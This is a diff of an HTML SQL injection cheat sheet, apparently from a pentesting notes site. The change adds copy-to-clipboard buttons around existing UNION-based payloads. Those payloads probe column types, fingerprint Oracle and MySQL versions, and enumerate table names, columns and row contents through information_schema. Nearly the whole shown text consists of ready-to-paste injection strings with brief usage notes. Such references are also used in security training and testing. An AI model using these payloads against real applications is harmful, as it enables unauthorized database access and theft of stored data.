@@ -81,20 +81,29 @@ Sample:</p><div class='parent'>
 </div>
 	
 2. get field type
-<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>* assuming four columns
-<mark>' UNION SELECT NULL,'a',NULL,NULL--</mark>
-<mark>' UNION SELECT 'a','a' FROM DUAL--</mark>* assuming two columns
-	
+<div class='parent'>
+<div class='child inline-block-child'><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT03')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT04')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT05')">ctrl+C</button></div>
+</div>
+
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
-<b>ORACLE:</b><mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | <mark>' UNION SELECT banner,NULL FROM v$version--</mark>
+<b>ORACLE:</b>
+<div class='parent'>
+<div class='child inline-block-child'><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT06')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT07')">ctrl+C</button></div>
 *assuming it has two columns and both are type string.
-
-<b>MYSQL | SQL:</b> <mark>' UNION SELECT @@version,NULL#</mark>
+</div>
+	
+<b>MYSQL | SQL:</b> 
+<div class='parent'>
+<div class='child inline-block-child'><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT08')">ctrl+C</button></div>
 *assuming it has two columns and first is type string.
+</div>
 	
 <b>POSTGRESQL:</b></p>
 </details>
@@ -108,17 +117,17 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 2. get field type
 
 *after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
-
-<mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark>
+<div class='parent'>
+<div class='child inline-block-child'><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT01')">ctrl+C</button></div>
 
 *once table is identified, it is time to retrieve the COLUMNS of the table
 
-<mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark>
+<div class='child inline-block-child'><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT02')">ctrl+C</button></div>
 
 *once table_name and columns are identified, it is time to retrieve the CONTENT
 
-<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
-
+<div class='child inline-block-child'><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LDCT03')">ctrl+C</button></div>
+</div>
 </details>
 <details>
 <summary>ORACLE</summary>
